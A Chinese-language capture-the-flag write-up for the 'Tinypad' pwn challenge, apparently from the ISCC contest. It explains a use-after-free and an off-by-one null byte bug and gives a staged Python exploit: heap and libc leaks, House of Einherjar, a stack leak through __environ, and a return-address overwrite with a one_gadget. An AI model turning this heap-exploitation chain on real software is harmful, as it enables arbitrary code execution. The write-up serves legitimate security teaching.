# pwn5-Tinypad WP

## 题型判断

远端：

```text
39.96.193.120:10003
```

附件对应二进制：

```text
pwn5-先声夺人/combination_final
pwn5-先声夺人/libc.so.6
```

## 程序关键点

程序有两个核心漏洞。

### 1. UAF

删除 note 时只把 `size` 清零，没有把指针清零，所以释放后仍然会在主界面把旧指针内容打印出来，可以借此泄露：

- heap 地址
- unsorted bin 指针，从而泄露 libc

### 2. off-by-one null

`read_until` 在读满时仍然会额外补一个 `\x00`：

```c
for (i = 0; i < len; i++) {
    read(0, &buf[i], 1);
    if (!buf[i] || buf[i] == '\n') {
        break;
    }
}
buf[i] = 0;
```

这样就能把相邻 chunk 的 `PREV_INUSE` 清掉，配合伪造的 `prev_size` 走 `House of Einherjar`。

## 利用思路

1. `delete(3); delete(1)` 利用 UAF 泄露 heap 和 libc
2. 利用 off-by-one + fake chunk + backward consolidate 触发 `House of Einherjar`
3. 改写 `tinypad` 元数据，把 note 指针改到 `__environ`，泄露栈地址，再改写 `main` 返回地址为 `one_gadget`

## 详细利用

### 第一阶段：泄露 heap 和 libc

先申请四个 `0x80`：

```python
add(0x80, b"1" * 0x80)
add(0x80, b"2" * 0x80)
add(0x80, b"3" * 0x80)
add(0x80, b"4" * 0x80)
```

然后：

```python
delete(3)
delete(1)
```

此时主界面会把已释放 chunk 的内容打印出来。

第一个泄露值来自堆链表残留，这里可以恢复 heap 基址：

```python
heap_base = leak1 - 0x120
```

第三个位置会泄露 unsorted bin 指针，进而算出 libc：

```python
libc_base = leak2 - 0x58 - __malloc_hook - 0x10
```

### 第二阶段：House of Einherjar

先清掉剩余两个旧 chunk：

```python
delete(2)
delete(4)
```

然后重新布置堆：

```python
add(0x10,  b"1" * 0x10)
add(0x100, b"2" * 0xF8 + p64(0x11))
add(0x80,  b"3" * 0x80)
add(0x80,  b"4" * 0x80)
```

接着释放 1 号位，再申请一个 `0x18` 的 chunk，把伪造的 `prev_size` 写进去：

```python
delete(1)
add(0x18, b"1" * 0x10 + p64(heap_base - tinypad))
```

在 3 号 chunk 里布置 fake chunk：

```python
edit(3, b"3" * 0x20 + p64(0) + p64(0x21) + p64(tinypad + 0x20) * 2 + p64(0x20))
```

再 `delete(2)`，触发 backward consolidation，把 fake chunk 卷进去。

之后继续把 4 号 note 改成指向 `main_arena + 0x58` 一类的位置，让下一次 `malloc` 返回到 `tinypad` 元数据附近：

```python
edit(4, b"4" * 0x20 + p64(0) + p64(0x101) + p64(__malloc_hook + 0x10 + 0x58) * 2)
```

### 第三阶段：打到栈并覆写返回地址

申请：

```python
add(0xF0, b"2" * 0xD0 + p64(666) + p64(__environ) + b"a" * 8 + p64(tinypad + 0x108))
```

这样就把 `INDEX 1` 的指针改到 `__environ`，主界面会直接把栈地址打印出来。

```python
main_ret = stack_addr - offset
edit(2, p64(main_ret))
edit(1, p64(one_gadget))
```

这份靶场环境里，最终可用的是：

```python
main_ret = stack_addr - 0xF0
one_gadget = libc_base + 0x45226
```

## 最终 flag

远端实测读到：

```text
ISCC{06b8e23e-ac80-450b-8273-717baf7d0ee3}
```
